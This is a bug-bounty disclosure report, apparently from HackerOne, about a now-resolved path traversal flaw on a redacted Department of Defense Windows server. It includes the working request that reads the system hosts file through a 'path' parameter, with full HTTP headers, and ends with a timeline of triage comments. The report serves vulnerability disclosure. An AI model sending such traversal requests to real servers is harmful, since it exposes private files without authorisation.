---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/web
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2022-09-14
submitted: 2022-07-18T20:47:02.448Z
bounty_usd: null
votes: 3
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "0x45"
source: "https://hackerone.com/reports/1641148"
title: "Directory Traversal at █████"
---
# Directory Traversal at █████

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 3 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2022-09-14

- Report: [https://hackerone.com/reports/1641148](https://hackerone.com/reports/1641148)
- CWE: Path Traversal
- Submitted: 2022-07-18T20:47:02.448Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi  DoD!

I found directory traversal vulnerability at ████. I didn't find available title for this issue that's why I selected remote file inclusion.

###  Host: ██████
###  Vulnerability: Directory Traversal in Windows Server
###  Tool Used: BurpSuite

### Parameter:  ==path==

###HTTP GET Request###
==GET /File/Download?path=C:/WINDOWS/System32/drivers/etc/hosts==

### Response

███

## Impact

Attacker could read sensitive file in server

## System Host(s)
███████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Make HTTP Request like that;

GET /File/Download?path=C:/WINDOWS/System32/drivers/etc/hosts HTTP/1.1
Host: ███
Cookie: .AspNetCore.Antiforgery.GupjSGuR2ZQ=CfDJ8GfYfRi9j8NNoBU6zVTpTKTbaG72CuADzxVVYVr9efssbxXYtgzCMF2H6PvdOcF0RxMExCsaObiVNuop1ouJa2Nb0k3z4KYTy2ih_nRbxREcZZo-3LBJPXq05kvRrRF6p02TakoqGzC6VUTdPRw-bo8; TimeZoneOffset=-240
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

## Suggested Mitigation/Remediation Actions
Input Validation for path parameter

## Timeline

- **Report Filed**
- **Report Severity Updated**
- **Report Triaged**
- **2022-07-19** @0x45: You are more than welcome! May I share this picture on my linkedln account (without disclosure vulnerability details)?

██████████
- **2022-07-19** @agent-z1: @0x45 I don't see any problem with posting the screenshot you have uploaded.  Please make sure not to post any report IDs or actionable intel until the finding is fully resolved.
- **2022-07-19** @0x45: Thank you so much! @agent-z1
- **Report Resolved**
- **2022-09-14** @0x45: Hi @agent-j5 !

Thanks a lot! Will you publish the report? 

Regards,
- **2022-09-14** @agent-j5: Greetints @0x45, we do not publish reports but you can use the drop down box and put in a request so you can disclose the report.
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
